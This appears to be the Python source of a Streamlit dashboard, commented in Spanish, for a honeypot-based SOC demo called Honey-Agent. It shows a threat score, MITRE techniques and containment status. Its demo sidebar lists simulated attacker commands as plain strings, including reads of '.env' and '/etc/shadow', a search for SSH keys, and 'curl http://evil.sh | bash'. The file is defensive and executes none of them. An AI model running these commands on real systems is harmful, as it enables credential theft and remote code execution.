# Dueño: P4 — Defensa y SOC
# Responsabilidad: Panel Streamlit en vivo: velocímetro de Threat Score, técnicas activas y alerta CONTAINED & BLOCKED.
# Puede importar: eventos de honey_agent.contracts publicados por el bus, y librerías de UI
# No importar: honey_agent.defense, honey_agent.ingress, honey_agent.vfs, honey_agent.posix, honey_agent.tarpit, honey_agent.canary

from __future__ import annotations

import sys
from pathlib import Path

# Agregar directorio dashboard al path para imports locales
dashboard_dir = Path(__file__).resolve().parent
if str(dashboard_dir) not in sys.path:
    sys.path.insert(0, str(dashboard_dir))

import streamlit as st

from components.containment_banner import render_containment_banner
from components.mitre_matrix import render_mitre_matrix
from components.score_gauge import render_score_gauge
from components.timeline import render_terminal_feed

# Configuración de página Streamlit
st.set_page_config(
    page_title="Honey-Agent | SOC Active Defense",
    page_icon="🛡️",
    layout="wide",
    initial_sidebar_state="expanded",
)

# Estilos CSS personalizados para estética premium SOC Cyberpunk/Dark
st.markdown("""
<style>
    .main {
        background-color: #0b0f19;
        color: #f1f5f9;
    }
    .metric-card {
        background: #1e293b;
        border: 1px solid #334155;
        border-radius: 8px;
        padding: 12px 16px;
        text-align: center;
    }
</style>
""", unsafe_allow_html=True)


def init_session_state() -> None:
    """Inicializa el estado reactivo del dashboard en memoria."""
    if "threat_score" not in st.session_state:
        st.session_state.threat_score = 0.0
    if "is_contained" not in st.session_state:
        st.session_state.is_contained = False
    if "containment_reason" not in st.session_state:
        st.session_state.containment_reason = ""
    if "active_mitre" not in st.session_state:
        st.session_state.active_mitre = set()
    if "history" not in st.session_state:
        st.session_state.history = []
    if "attacker_ip" not in st.session_state:
        st.session_state.attacker_ip = "192.168.1.105"


init_session_state()

# Barra lateral: Configuración y Simulador de Ataques para Demo
st.sidebar.title("🎛️ Consola de Control SOC")
st.sidebar.markdown("**Honey-Agent Deception Engine v1.0**")
st.sidebar.divider()

st.sidebar.subheader("🎯 Inyección Rápida (Demo Mode)")
demo_choice = st.sidebar.selectbox(
    "Seleccionar Payload Ofensivo:",
    [
        "1. Reconocimiento (uname -a)",
        "2. Enumeración de Usuario (whoami)",
        "3. Descubrimiento de Archivos (find / -name id_rsa)",
        "4. Robo de Credenciales (.env)",
        "5. Extracción Crítica (/etc/shadow)",
        "6. RCE Crítico (curl http://evil.sh | bash)",
    ],
)

if st.sidebar.button("🚀 Ejecutar Payload en Decoy", use_container_width=True):
    if "1." in demo_choice:
        st.session_state.threat_score = min(100.0, st.session_state.threat_score + 10.0)
        st.session_state.active_mitre.add("T1082")
        st.session_state.history.append({"command": "uname -a", "mitre": "T1082", "score": st.session_state.threat_score, "delay_ms": 45})
    elif "2." in demo_choice:
        st.session_state.threat_score = min(100.0, st.session_state.threat_score + 10.0)
        st.session_state.active_mitre.add("T1033")
        st.session_state.history.append({"command": "whoami", "mitre": "T1033", "score": st.session_state.threat_score, "delay_ms": 48})
    elif "3." in demo_choice:
        st.session_state.threat_score = min(100.0, st.session_state.threat_score + 35.0)
        st.session_state.active_mitre.add("T1552.004")
        st.session_state.history.append({"command": "find / -name id_rsa", "mitre": "T1552.004", "score": st.session_state.threat_score, "delay_ms": 1450})
    elif "4." in demo_choice:
        st.session_state.threat_score = min(100.0, st.session_state.threat_score + 30.0)
        st.session_state.active_mitre.add("T1552.001")
        st.session_state.history.append({"command": "cat /var/www/html/.env", "mitre": "T1552.001", "score": st.session_state.threat_score, "delay_ms": 1200})
    elif "5." in demo_choice:
        st.session_state.threat_score = 100.0
        st.session_state.is_contained = True
        st.session_state.containment_reason = "CRITICAL_TECHNIQUE: T1003 (OS Credential Dumping)"
        st.session_state.active_mitre.add("T1003")
        st.session_state.history.append({"command": "cat /etc/shadow", "mitre": "T1003", "score": 100.0, "delay_ms": 2500})
    elif "6." in demo_choice:
        st.session_state.threat_score = 100.0
        st.session_state.is_contained = True
        st.session_state.containment_reason = "CRITICAL_TECHNIQUE: T1059.001 (Pipe Bash Remote Execution)"
        st.session_state.active_mitre.add("T1059.001")
        st.session_state.history.append({"command": "curl http://evil.sh | bash", "mitre": "T1059.001", "score": 100.0, "delay_ms": 3800})

    if st.session_state.threat_score >= 80.0 and not st.session_state.is_contained:
        st.session_state.is_contained = True
        st.session_state.containment_reason = f"THREAT_THRESHOLD_EXCEEDED: Score={st.session_state.threat_score}%"
    st.rerun()

st.sidebar.divider()
if st.sidebar.button("🔄 Reiniciar Sesión / Reset SOC", use_container_width=True):
    st.session_state.threat_score = 0.0
    st.session_state.is_contained = False
    st.session_state.containment_reason = ""
    st.session_state.active_mitre = set()
    st.session_state.history = []
    st.rerun()

# Cabecera Principal
st.title("🛡️ Honey-Agent: Centro de Operaciones de Seguridad (SOC)")
st.caption("Monitoreo de Decepción Activa, Clasificación Táctica y Neutralización en Kernel")

# Tarjetas KPI superiores
col_kpi1, col_kpi2, col_kpi3, col_kpi4 = st.columns(4)
with col_kpi1:
    st.metric(label="Sesión Activa", value="sess-prod-01", delta="SSH Decoy (Port 22)")
with col_kpi2:
    st.metric(label="IP Hostil", value=st.session_state.attacker_ip, delta="Geo: RU / ASN 48281")
with col_kpi3:
    st.metric(
        label="Estado de Contención",
        value="CONTAINED" if st.session_state.is_contained else "MONITORING",
        delta="DROP < 5ms" if st.session_state.is_contained else "Zero-Disk VFS",
        delta_color="inverse" if st.session_state.is_contained else "normal",
    )
with col_kpi4:
    st.metric(label="Técnicas MITRE Detectadas", value=len(st.session_state.active_mitre), delta="Enterprise Matrix")

st.divider()

# Layout Principal en dos columnas
col_left, col_right = st.columns([6, 5])

with col_left:
    # 1. Alerta de Contención si la sesión fue neutralizada
    if st.session_state.is_contained:
        render_containment_banner(
            attacker_ip=st.session_state.attacker_ip,
            reason=st.session_state.containment_reason,
            kernel_cmd=f"/usr/sbin/iptables -I INPUT -s {st.session_state.attacker_ip} -j DROP",
            duration_ms=3.4,
        )

    # 2. Velocímetro Threat Score
    render_score_gauge(score=st.session_state.threat_score)

    # 3. Terminal Feed en vivo
    render_terminal_feed(st.session_state.history)

with col_right:
    # 4. Matriz MITRE ATT&CK reactiva
    render_mitre_matrix(st.session_state.active_mitre)
